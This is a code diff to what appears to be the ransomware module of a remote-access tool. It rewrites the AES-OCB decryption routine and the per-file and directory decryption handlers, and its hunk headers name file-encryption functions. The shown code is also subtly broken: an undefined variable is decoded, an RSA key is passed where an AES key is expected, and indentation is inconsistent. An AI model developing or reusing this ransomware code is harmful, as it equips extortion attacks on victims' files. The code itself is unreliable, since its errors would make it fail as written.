@@ -231,15 +231,27 @@ def decrypt_ransom_aes(ciphertext, key, padding=chr(0)):
     Returns decrypted plaintext as string
 
     """
-    if sys.version_info[0] > 2:
-        data = BytesIO(base64.b64decode(ciphertext))
-    else:
-        data = StringIO(base64.b64decode(ciphertext))
+    try:
+        # Decode the Base64-encoded ciphertext
+        ciphertext = base64.b64decode(ciphertext_b64)
+        
+        # Extract nonce, tag, and ciphertext from the combined output
+        nonce = ciphertext[:15]  # OCB mode nonce size
+        tag = ciphertext[15:31] # 16-byte authentication tag
+        encrypted_data = ciphertext[31:]
 
-    nonce, tag, ciphertext = [ data.read(x) for x in (Crypto.Cipher.AES.block_size - 1, Crypto.Cipher.AES.block_size, -1) ]
-    cipher = Crypto.Cipher.AES.new(key, Crypto.Cipher.AES.MODE_OCB, nonce)
-    return cipher.decrypt_and_verify(ciphertext, tag)
+        # Initialize the cipher with the nonce
+        cipher = AES.new(key, AES.MODE_OCB, nonce=nonce)
+        
+        # Decrypt and verify the ciphertext
+        plaintext = cipher.decrypt_and_verify(encrypted_data, tag)
 
+    except Exception as e:
+        log("{} error: {}".format(decrypt_ransom_aes.__name__, str(e)))
+        return traceback.format_exc()
+    
+
+    return plaintext.decode("utf-8", errors="ignore")
 
 def encrypt_file(filename, rsa_key):
     """
@@ -305,19 +317,30 @@ def decrypt_file(filename, key):
     Returns True if succesful, otherwise False
 
     """
+    if not os.path.isfile(filename):
+        log("File '{}' not found".format(filename))
+        return f"file {filename} not found"
+
     try:
-        if os.path.isfile(filename):
             with open(filename, 'rb') as fp:
                 ciphertext = fp.read()
-            plaintext = decrypt_ransom_aes(ciphertext, key)
-            with open(filename, 'wb') as fd:
-                fd.write(plaintext)
-            return True
-        else:
-            log("File '{}' not found".format(filename))
+
+            try:
+                plaintext = decrypt_ransom_aes(ciphertext, key)
+
+                with open(filename, 'wb') as fd:
+                    fd.write(plaintext)
+            except Exception as e:
+                log(f'error decoding ransom aes {e}')
+                return f'error decoding ransom aes {e}'
+
+            log('{} decrypted'.format(filename))
+            return '{} decrypted'.format(filename)
+
     except Exception as e:
         log("{} error: {}".format(decrypt_file.__name__, str(e)))
-    return False
+        return "{} error: {}".format(decrypt_file.__name__, str(e))
+
 
 def encrypt_files(args):
     """
@@ -373,7 +396,11 @@ def decrypt_files(action):
     output = shlex.split(action)
     print(f'\noutput into decrypt:\n{output}\n')
     rsa_key = output[2]
+    target = output[0]
     # location, pub, priv
+
+    if not os.path.exists(target):
+        return "File '{}' does not exist".format(target)
 
     try:
         rsa_key = format_rsa(rsa_key, public = False)
@@ -381,9 +408,16 @@ def decrypt_files(action):
         if not rsa_key.has_private():
             return "Error: RSA key cannot decrypt"
 
-        globals()['threads']['iter_files'] = _iter_files(rsa_key)
-        globals()['threads']['decrypt_files'] = _threader(rsa_key)
-        return "Decrypting files"
+        if os.path.isfile(target):
+            res = decrypt_file(target, rsa_key)
+            return res
+
+
+
+        if os.path.isdir(target):
+            # globals()['threads']['iter_files'] = _iter_files(rsa_key)
+            # globals()['threads']['decrypt_files'] = _threader(rsa_key)
+            return "Decrypting files"
     except Exception as e:
         log("decrypt_files {} error: {}".format(decrypt_files.__name__, str(e)))
         return traceback.format_exc()
